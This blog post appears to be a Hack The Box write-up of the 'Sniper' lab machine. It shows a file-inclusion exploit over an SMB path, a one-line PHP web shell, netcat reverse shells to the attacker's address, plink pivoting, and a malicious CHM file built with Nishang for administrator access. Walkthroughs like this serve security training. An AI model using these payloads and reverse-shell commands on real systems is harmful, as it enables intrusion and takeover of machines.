---
layout: single
title: Sniper - Hack The Box
excerpt: "Sniper is another box I got access to through an unintended method. The PHP application wasn't supposed to be exploitable through Remote File Inclusion but because it runs on Windows, we can use UNC path to include a file from an SMB share. Once I had a shell, I pivoted using plink and logged in as user Chris with WinRM. The box author was nice enough to leave hints as to what kind of malicious payload was expected and I used Nishang to generate a CHM payload and get Administrator access."
date: 2020-03-28
classes: wide
header:
  teaser: /assets/images/htb-writeup-sniper/sniper_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  - php
  - rfi
  - unintended
  - plink
  - winrm
  - chm
---

![](/assets/images/htb-writeup-sniper/sniper_logo.png)

Sniper is another box I got access to through an unintended method. The PHP application wasn't supposed to be exploitable through Remote File Inclusion but because it runs on Windows, we can use UNC path to include a file from an SMB share. Once I had a shell, I pivoted using plink and logged in as user Chris with WinRM. The box author was nice enough to leave hints as to what kind of malicious payload was expected and I used Nishang to generate a CHM payload and get Administrator access.

## Summary

- Exploit an RFI in the language parameter to include a PHP file through SMB and gain RCE
- Retrieve the MySQL credentials from the database
- Upgrade the shell to a meterpreter shell and port forward WinRM
- Login as user Chris with the forwarded WinRM socket
- Identify through hints that the admin is waiting for a .chm file
- Craft a malicious .chm file and get a reverse shell as Administrator

## Portscan

```
root@kali:~/htb/sniper# nmap -sC -sV -T4 -p- 10.10.10.151
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-06 09:01 EDT
Nmap scan report for sniper.htb (10.10.10.151)
Host is up (0.049s latency).
Not shown: 65530 filtered ports
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Sniper Co.
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
49667/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h00m13s
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2019-10-06T20:04:16
|_  start_date: N/A
```

## SMB

No access to shares on SMB

```
root@kali:~/htb/sniper# smbmap -u invalid -H 10.10.10.151
[+] Finding open SMB ports....
[!] Authentication error occured
[!] SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid. This is either due to a bad username or authentication information.)
[!] Authentication error on 10.10.10.151
root@kali:~/htb/sniper# smbmap -u '' -H 10.10.10.151
[+] Finding open SMB ports....
[!] Authentication error occured
[!] SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)
[!] Authentication error on 10.10.10.151
```

## Web

The website is pretty generic and most of the links don't work.

![](/assets/images/htb-writeup-sniper/website1.png)

At the bottom of the main page there is a link to the User Portal.

![](/assets/images/htb-writeup-sniper/website2.png)

The user portal has a login page and there is a link at the bottom to register a new user.

![](/assets/images/htb-writeup-sniper/website3.png)

The registration page looks like this.

![](/assets/images/htb-writeup-sniper/website4.png)

After creating myself an account, I log in and see that it's still under construction.

![](/assets/images/htb-writeup-sniper/construction.png)

Next, I scanned the site with [rustbuster](https://github.com/phra/rustbuster) and found a blog link I didn't see earlier.

![](/assets/images/htb-writeup-sniper/dirb1.png)

![](/assets/images/htb-writeup-sniper/dirb2.png)

![](/assets/images/htb-writeup-sniper/dirb3.png)

The blog is pretty generic but there is an interesting link to change the language of the page.

![](/assets/images/htb-writeup-sniper/blog1.png)

As shown in the source code, it is possibly a target for an LFI or RFI since it references a PHP file.

![](/assets/images/htb-writeup-sniper/blog2.png)

## Gaining RCE through RFI in the language parameter

To test for local file inclusion I'll try including a Windows file I know exists on the target machine. Luckily for me the `lang` parameter uses the filename with the extension so I can potentially include any file, not just file with php extensions. I am able to get the content of `win.ini` with the following:

`GET /blog/?lang=/windows/win.ini`

![](/assets/images/htb-writeup-sniper/lfi1.png)

Next I try to include a remote file through HTTP with `GET /blog/?lang=http://10.10.14.11/test.php` but I didn't get a callback so I assume remote file includes are disabled or there is some filtering done on the parameter.

Even though remote file includes are disabled, using a UNC path works since it's considered a local path by PHP and I'm able to get a callback through SMB on port 445 with `GET /blog/?lang=//10.10.14.11/test/test.php`

![](/assets/images/htb-writeup-sniper/smb1.png)

I can't get impacket-smbserver working right with this box so instead I'll use the standard Samba server in Linux and create an open share: `net usershare add test /root/htb/sniper/share '' 'Everyone:F' guest_ok=y`

Before trying to get RCE, I'll create an `info.php` file that calls `phpinfo()` so I can check for any disabled functions:

```php
<?php
phpinfo();
?>
```

After calling `phpinfo()` with `GET /blog/?lang=//10.10.14.11/test/info.php` I see that it's running Windows build 17763 and that no functions are disabled.

![](/assets/images/htb-writeup-sniper/info1.png)

![](/assets/images/htb-writeup-sniper/info2.png)

Next I'll create another PHP file to execute commands passed in the `cmd` parameter:

```php
<?php
system($_GET["cmd"]);
?>
```

And with the following request I can execute commands: `GET /blog/?lang=//10.10.14.11/test/nc.php&cmd=whoami`

![](/assets/images/htb-writeup-sniper/rce1.png)

To get a shell I'll upload netcat to the server with `GET /blog/?lang=//10.10.14.11/test/nc.php&cmd=copy+\\10.10.14.11\test\nc.exe+c:\programdata\nc.exe`

![](/assets/images/htb-writeup-sniper/rce2.png)

Then I execute netcat to get a shell with `GET /blog/?lang=//10.10.14.11/test/nc.php&cmd=c:\programdata\nc.exe+-e+cmd.exe+10.10.14.11+80`

![](/assets/images/htb-writeup-sniper/shell.png)

## Enumeration of the machine

The first thing I check is the `C:\inetpub\wwwroot\user\db.php` file used by the login portal so I can see which credentials are used to connect to the database:

```php
<?php
// Enter your Host, username, password, database below.
// I left password empty because i do not set password on localhost.
$con = mysqli_connect("localhost","dbuser","36mEAhz/B8xQ~2VM","sniper");
// Check connection
if (mysqli_connect_errno())
  {
  echo "Failed to connect to MySQL: " . mysqli_connect_error();
  }
?>
```

Then I check out which local users are present on the box:

```
C:\>net users

User accounts for \\

-------------------------------------------------------------------------------
Administrator            Chris                    DefaultAccount
Guest                    WDAGUtilityAccount
```

The next logical step is to get access to user `Chris`:

```
...
Local Group Memberships      *Remote Management Users
Global Group memberships     *None
...
```

Chris is part of the Remote Management Users group and WinRM is listening on port 5985 but firewalled off from the outside.

```
C:\>netstat -an

Active Connections

  Proto  Local Address          Foreign Address        State
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:3306           0.0.0.0:0              LISTENING
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING
  TCP    0.0.0.0:33060          0.0.0.0:0              LISTENING
[...]
...
```

## Shell as user Chris with WinRM

To connect to WinRM I'll upload plink.exe and create a reverse tunnel for port 5985.

![](/assets/images/htb-writeup-sniper/plink.png)

After pivoting, I am able to log in as user Chris.

![](/assets/images/htb-writeup-sniper/chris.png)

I find that WinRM is a tad slow so I'll spawn another netcat as user Chris to continue my enumeration.

## More enumeration

The `c:\docs` directory was previously unaccessible with the previous user but I can see the files now with user Chris.

```
C:\docs>dir
 Volume in drive C has no label.
 Volume Serial Number is 6A2B-2640

 Directory of C:\docs

10/01/2019  01:04 PM    <DIR>          .
10/01/2019  01:04 PM    <DIR>          ..
04/11/2019  09:31 AM               285 note.txt
04/11/2019  09:17 AM           552,607 php for dummies-trial.pdf
               2 File(s)        552,892 bytes
               2 Dir(s)  17,885,601,792 bytes free
```

The .pdf doesn't have anything interesting but `note.txt` contains a hint:

```
type note.txt
Hi Chris,
	Your php skillz suck. Contact yamitenshi so that he teaches you how to use it and after that fix the website as there are a lot of bugs on it. And I hope that you've prepared the documentation for our new app. Drop it here when you're done with it.

Regards,
Sniper CEO.
```

Ok, so the CEO (probably the administrator) is expecting some documentation files to be dropped in this folder. There's probably a script bot running and opening files in this folder. I don't know what kind of payload he's expecting so I'll keep on looking around the box.

The `C:\Users\Chris\Downloads` directory contains a CHM file.

```
C:\Users\Chris\Downloads>dir
 Volume in drive C has no label.
 Volume Serial Number is 6A2B-2640

 Directory of C:\Users\Chris\Downloads

04/11/2019  08:36 AM    <DIR>          .
04/11/2019  08:36 AM    <DIR>          ..
04/11/2019  08:36 AM            10,462 instructions.chm
               1 File(s)         10,462 bytes
               2 Dir(s)  17,885,601,792 bytes free
```

As per Wikipedia:

> Microsoft Compiled HTML Help is a Microsoft proprietary online help format, consisting of a collection of HTML pages, an index and other navigation tools. The files are compressed and deployed in a binary format with the extension .CHM, for Compiled HTML. The format is often used for software documentation.

So now things are starting to click:
1. The admin/CEO is expecting documentation
2. The instruction.chm file is a compiled html file used for documentation

I remembered reading about malicious CHM files some time ago so I make sure to open the file in an isolated Windows VM:

![](/assets/images/htb-writeup-sniper/instructions.png)

I did some research and found the [Nishang Out-CHM](https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1) tool that can generate malicious payload. I should be able to get RCE as the administrator with this malicious file.

## Generating a malicious CHM file for privilege escalation

After installing the HTML Help Workshop on my Windows machine, I generated a malicious CHM file that uses netcat to spawn a reverse shell:

`PS > Out-CHM -Payload "C:\programdata\nc.exe -e cmd.exe 10.10.14.11 3333" -HHCPath "C:\Program Files (x86)\HTML Help Workshop"`

Uploaded it to the server...

`*Evil-WinRM* PS C:\docs> copy \\10.10.14.11\test\doc.chm .`

And boom, got a shell as `administrator`:

![](/assets/images/htb-writeup-sniper/root.png)